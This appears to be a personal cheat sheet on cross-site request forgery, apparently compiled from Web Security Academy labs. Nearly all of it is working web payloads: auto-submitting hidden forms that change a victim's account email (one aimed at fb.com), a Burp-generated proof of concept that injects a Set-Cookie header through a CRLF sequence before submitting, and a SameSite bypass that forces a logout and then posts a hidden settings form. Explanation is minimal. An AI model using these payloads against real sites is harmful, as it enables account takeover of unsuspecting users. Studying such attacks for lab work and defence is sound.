# CSRF

```python
Checklists:
	>token is not tied to user session
	>is token in cookie
```

- No Defense
    
    ```bash
    <form method="POST" action="https://fb.com/my-account/change-email">
        <input type="hidden" name="email" value="uugana@hacked.net">
    </form>
    <script>
            document.forms[0].submit();
    </script>
    ```
    
- Inject key
    
    ```
    <form method="POST" action="https://fb.com/my-account/change-email">
        <input type="hidden" name="email" value="uugana@hacked.net">
    </form>
    <script>
            document.forms[0].submit();
    </script>
    ```
    
- CSRF cookie token not tied to session
    
    ```html
    <html>
      <!-- CSRF PoC - generated by Burp Suite Professional -->
      <body>
      <script>history.pushState('', '', '/')</script>
        <form action="https://0ae5002a034523cc81c4070e00130089.web-security-academy.net/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="sdaaa&#64;gmail&#46;com" />
          <input type="hidden" name="csrf" value="R9uK8GANErEtuDCuacZXUW5k2Yg2SyuM" />
          <input type="submit" value="Submit request" />
        </form>
    <img src="https://0ae5002a034523cc81c4070e00130089.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ltnz7bt9hbZHGO66bZ4CXpq2rsU8C8Wz%3b%20SameSite=None" onerror="document.forms[0].submit()">
      </body>
    </html>
    ```
    

- samesite bypass by logout and 2 minute attack window

```jsx
<script>
function go(){
let w = window.open("https://x-23.herokuapp.com/hi/logout.html",'');
setTimeout(function(){w.close();csrf.submit()},1000)
}
</script>

<h1 onclick=go()>Click me</h1>

<form style="display:none" name=csrf 
method=post action="https://x-23.herokuapp.com/hi/settings.php">
<input name=new_name value="pwned">
<input type=submit>
</form>
```